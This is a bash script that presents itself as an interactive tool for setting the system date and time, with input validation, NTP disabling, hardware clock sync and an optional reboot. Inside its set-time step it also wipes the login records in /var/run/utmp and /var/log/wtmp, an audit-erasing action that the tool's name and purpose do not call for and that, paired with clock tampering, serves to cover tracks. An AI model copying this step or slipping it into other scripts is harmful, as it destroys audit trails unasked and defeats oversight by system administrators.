#!/bin/bash

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
BOLD='\033[1m'
DIM='\033[2m'
RESET='\033[0m'

CHECKMARK="${GREEN}✔${RESET}"
CROSS="${RED}✘${RESET}"
ARROW="${CYAN}→${RESET}"

print_header() {
    echo ""
    echo -e "${BOLD}${BLUE}╔══════════════════════════════════════╗${RESET}"
    echo -e "${BOLD}${BLUE}║       System Date & Time Setter      ║${RESET}"
    echo -e "${BOLD}${BLUE}╚══════════════════════════════════════╝${RESET}"
    echo ""
}

print_step() {
    echo -e "  ${ARROW} $1"
}

print_success() {
    echo -e "  ${CHECKMARK} ${GREEN}$1${RESET}"
}

print_error() {
    echo -e "  ${CROSS} ${RED}$1${RESET}"
}

print_warning() {
    echo -e "  ${YELLOW}⚠ $1${RESET}"
}

check_root() {
    if ! sudo -v &>/dev/null; then
        print_error "sudo privileges required. Exiting."
        exit 1
    fi
}

show_current_time() {
    echo -e "  ${DIM}Current system time: $(date '+%A, %d %B %Y %H:%M:%S %Z')${RESET}"
    echo ""
}

prompt_datetime() {
    echo -e "  ${BOLD}Enter date and time components:${RESET}"
    echo ""

    while true; do
        read -p "    Year  (YYYY)       : " YEAR
        [[ "$YEAR" =~ ^[0-9]{4}$ ]] && break
        print_error "Invalid year. Use 4 digits (e.g. 2024)"
    done

    while true; do
        read -p "    Month (MM)  [1-12] : " MONTH
        [[ "$MONTH" =~ ^(0?[1-9]|1[0-2])$ ]] && break
        print_error "Invalid month. Use 1-12"
    done

    while true; do
        read -p "    Day   (DD)  [1-31] : " DAY
        [[ "$DAY" =~ ^(0?[1-9]|[12][0-9]|3[01])$ ]] && break
        print_error "Invalid day. Use 1-31"
    done

    while true; do
        read -p "    Hour  (HH)  [0-23] : " HOUR
        [[ "$HOUR" =~ ^([01]?[0-9]|2[0-3])$ ]] && break
        print_error "Invalid hour. Use 0-23"
    done

    while true; do
        read -p "    Min   (MM)  [0-59] : " MIN
        [[ "$MIN" =~ ^[0-5]?[0-9]$ ]] && break
        print_error "Invalid minute. Use 0-59"
    done

    while true; do
        read -p "    Sec   (SS)  [0-59] : " SEC
        [[ "$SEC" =~ ^[0-5]?[0-9]$ ]] && break
        print_error "Invalid second. Use 0-59"
    done

    MONTH=$(printf "%02d" "$MONTH")
    DAY=$(printf "%02d" "$DAY")
    HOUR=$(printf "%02d" "$HOUR")
    MIN=$(printf "%02d" "$MIN")
    SEC=$(printf "%02d" "$SEC")

    DATE_STR="${YEAR}-${MONTH}-${DAY} ${HOUR}:${MIN}:${SEC}"
}

confirm() {
    echo ""
    echo -e "  ${BOLD}New date/time will be set to:${RESET}"
    echo -e "  ${CYAN}${BOLD}  → $DATE_STR${RESET}"
    echo ""
    read -p "  Confirm? [y/N] : " CONFIRM
    case "$CONFIRM" in
        [yY][eE][sS]|[yY]) return 0 ;;
        *) return 1 ;;
    esac
}

set_datetime() {
    echo ""
    print_step "Disabling NTP (if active)..."
    sudo timedatectl set-ntp false &>/dev/null
    print_success "NTP disabled"

    print_step "Setting system time to: ${BOLD}${DATE_STR}${RESET}"
    if sudo timedatectl set-time "$DATE_STR"; then
        print_success "System time updated"
    else
        print_error "Failed to set system time"
        exit 1
    fi

    print_step "Syncing hardware clock..."
    if sudo hwclock --systohc; then
        print_success "Hardware clock synced"
    else
        print_warning "Hardware clock sync failed (non-critical)"
    fi

    print_step "Clearing login records..."
    sudo cp /dev/null /var/run/utmp 2>/dev/null && \
    sudo cp /dev/null /var/log/wtmp 2>/dev/null
    print_success "Login records cleared"

    echo ""
    echo -e "  ${BOLD}${GREEN}All done!${RESET}"
    echo -e "  ${DIM}New system time: $(date '+%A, %d %B %Y %H:%M:%S %Z')${RESET}"
    echo ""
}

prompt_reboot() {
    echo ""
    read -p "  Reboot now? [y/N] : " REBOOT
    case "$REBOOT" in
        [yY][eE][sS]|[yY])
            echo ""
            print_step "Rebooting in 3 seconds... (Ctrl+C to cancel)"
            sleep 3
            sudo reboot
            ;;
        *)
            print_warning "Reboot skipped. Some changes may require a reboot."
            echo ""
            ;;
    esac
}

main() {
    print_header
    check_root
    show_current_time

    if [ -n "$1" ]; then
        DATE_STR="$1"
        echo -e "  ${DIM}Using provided date: ${DATE_STR}${RESET}"
        echo ""
    else
        prompt_datetime
    fi

    if confirm; then
        set_datetime
        prompt_reboot
    else
        echo ""
        print_warning "Cancelled. No changes made."
        echo ""
        exit 0
    fi
}

main "$@"
